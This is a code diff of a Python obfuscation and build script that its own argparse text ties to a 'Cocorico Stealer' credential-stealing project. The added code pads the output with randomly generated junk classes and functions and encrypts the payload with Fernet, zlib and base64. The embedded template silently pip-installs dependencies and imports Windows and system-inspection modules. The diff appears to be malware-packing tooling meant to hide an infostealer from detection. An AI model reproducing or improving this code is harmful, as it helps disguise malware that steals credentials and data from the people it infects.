@@ -12,40 +12,84 @@ BUILD_PATH = "./build"
 ENCRYPTION_KEY_FILE = "encryption_key.txt"
 logging.basicConfig(level=logging.INFO)
 
-def generate_random_string(length=200, chars=string.ascii_letters):
+def generate_random_string(length=20, chars=string.ascii_letters):
     return ''.join(random.choice(chars) for _ in range(length))
-
-def generate_fake_code(num_vars=200, num_funcs=200, num_classes=200):
-    fake_code = [f"{generate_random_string()} = {repr(random.randint(1000000, 100000000))}" for _ in range(num_vars)]
-    
-    def get_user_info():
-        return {'username': generate_random_string(200), 'age': random.randint(18, 99)}
-    
-    def get_channel_name():
-        return repr(generate_random_string())
-    
-    def get_repos():
-        return [repr(generate_random_string()) for _ in range(random.randint(1, 5))]
-    
-    fake_functions = [get_user_info, get_channel_name, get_repos]
-    fake_classes = [
-        f"class {generate_random_string()}:\n    def __init__(self):\n        self.data = {repr(random.choice([True, False]))}\n    def get_data(self):\n        return self.data"
-        for _ in range(num_classes)
-    ]
-    all_code = fake_code + fake_functions + fake_classes
-    all_code = [str(item()) if callable(item) else str(item) for item in all_code]
-    all_code = random.sample(all_code, len(all_code))
-    return "\n".join(all_code)
-
-def encrypt_code(code, key):
-    return base64.b64encode(Fernet(key).encrypt(zlib.compress(code.encode('utf-8')))).decode('utf-8')
 
 def random_class_name():
     return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))
 
+def generate_fake_code(num_vars=20, num_funcs=20, num_classes=20):
+    fake_code = []
+
+    for _ in range(num_vars):
+        fake_code.append(f"{generate_random_string()} = \"{generate_random_string()}\"")
+
+    for _ in range(num_funcs):
+        func_name = generate_random_string()
+        param1 = generate_random_string()
+        param2 = generate_random_string()
+        fake_code.append(f"def {func_name}({param1}):\n"
+                         f"    {generate_random_string()} = {random.randint(10000, 100000)}\n"
+                         f"    {generate_random_string()} = {random.randint(10000, 100000)}\n")
+
+    for _ in range(num_funcs):
+        fake_code.append(f"{generate_random_string()} = \"{generate_random_string()}\"")
+
+    for _ in range(num_classes):
+        fake_code.append(f"""
+class {random_class_name()}:
+    def __init__(self):
+        self.{generate_random_string()} = \"{generate_random_string()}\"
+    
+    def {random_class_name()}(self):
+        return self.{generate_random_string()} + \"{generate_random_string()}\"
+    
+    def {random_class_name()}(self, {generate_random_string()}):
+        if not self.{generate_random_string()}(\"{generate_random_string()}\"):
+            self.{generate_random_string()}(\"{generate_random_string()}\")
+        if not self.{generate_random_string()}(\"{generate_random_string()}\"):
+            self.{generate_random_string()}(\"{generate_random_string()}\")
+        return self.{generate_random_string()}(\"{generate_random_string()}\")
+""")
+
+    fake_code.append(f"""
+{generate_random_string()} = {random.randint(10000, 100000)}
+{generate_random_string()} = {random.randint(10000, 100000)}
+{generate_random_string()} = {random.randint(10000, 100000)}
+
+""")
+
+    fake_code.append(f"""
+class {random_class_name()}:
+    def __init__(self):
+        self.{generate_random_string()} = \"{generate_random_string()}\"
+    
+    def {random_class_name()}(self):
+        return self.{generate_random_string()} + \"{generate_random_string()}\"
+    
+    def {random_class_name()}(self):
+        if not self.{generate_random_string()}([{random.randint(10000, 100000)}]):
+            self.{generate_random_string()}([{random.randint(10000, 100000)}])
+        if not self.{generate_random_string()}([{random.randint(10000, 100000)}]):
+            self.{generate_random_string()}([{random.randint(10000, 100000)}])
+        return self.{generate_random_string()}([{random.randint(10000, 100000)}])
+    
+    def {random_class_name()}({generate_random_string()}):
+        {generate_random_string()} = sorted([\"{generate_random_string()}\", {random.randint(10000, 100000)}, \"{generate_random_string()}\", "{generate_random_string()}"])
+        {generate_random_string()} = [\"{generate_random_string()}\", {random.randint(10000, 100000)}, \"{generate_random_string()}\", "{generate_random_string()}"]
+        for {generate_random_string()} in \"{generate_random_string()}\":
+            {generate_random_string()} = {random.randint(10000, 100000)}
+""")
+
+    random.shuffle(fake_code)
+    return "\n".join(fake_code)
+
+def encrypt_code(code, key):
+    return base64.b64encode(Fernet(key).encrypt(zlib.compress(code.encode('utf-8')))).decode('utf-8')
+
 def main():
-    parser = argparse.ArgumentParser(description='Obfuscate and create an executable.')
-    parser.add_argument('file', help='Path to the source file to obfuscate')
+    parser = argparse.ArgumentParser(description='Obfuscated file with Cocorico Stealer')
+    parser.add_argument('file', help='https://github.com/JohnDoe287/Cocorico-Stealer')
     args = parser.parse_args()
     
     os.makedirs(BUILD_PATH, exist_ok=True)
@@ -148,7 +192,6 @@ from importlib import import_module
 import aiohttp, psutil, win32api
 import xml.etree.ElementTree as ET
 
-
 try:
     import aiohttp, psutil, win32api
 except ImportError:
@@ -183,9 +226,6 @@ try:
 except:
     subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
     from Crypto.Cipher import AES
-    
-
-
 
 import requests
 {all_fake_code}
